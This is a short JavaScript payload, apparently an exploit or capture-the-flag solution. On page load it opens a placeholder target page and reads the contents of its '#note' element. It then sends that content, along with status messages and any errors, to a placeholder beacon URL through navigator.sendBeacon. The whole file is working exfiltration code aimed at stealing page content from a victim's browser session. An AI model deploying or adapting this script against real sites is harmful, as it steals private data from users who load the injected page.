(async () => {
    const beacon = "{{BEACON_PLACEHOLDER}}";
    async function sleep(ms) {
        return new Promise(resolve => setTimeout(resolve, ms));
    }
    window.addEventListener("DOMContentLoaded", async () => {
        try {
            navigator.sendBeacon(beacon, "inner script activated");
            let w = window.open("{{TARGET_PLACEHOLDER}}");
            await sleep(500);
            const note = w.document.querySelector("#note");
            console.log(note.innerHTML)
            navigator.sendBeacon(beacon,note.innerHTML);
        } catch (e) {
            navigator.sendBeacon(beacon, e.toString());
        }
    });
})();
